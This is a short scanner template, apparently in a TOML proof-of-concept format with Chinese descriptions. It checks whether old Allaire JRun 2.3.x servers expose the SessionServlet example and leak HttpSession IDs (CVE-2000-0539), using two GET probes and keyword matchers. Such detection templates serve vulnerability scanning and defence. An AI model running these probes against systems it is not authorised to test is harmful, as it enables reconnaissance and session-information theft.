[info]
author = "ave"
description = "检测 Allaire JRun 2.3.x 中 SessionServlet 示例是否可被远程访问并泄露 HttpSession ID 信息"
id = "POC-AVE-2000-0617"
name = "Allaire JRun Servlet 示例信息泄露检测 PoC"
severity = "medium"
tags = ["ave-2000-0617"]
vuln_id = [
    "CVE-2000-0539",
    "AVE-2000-0617",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/servlet/SessionServlet"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SessionServlet",
    "HttpSession",
    "session",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/examples/servlet/SessionServlet"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SessionServlet",
    "HttpSession",
    "session",
]
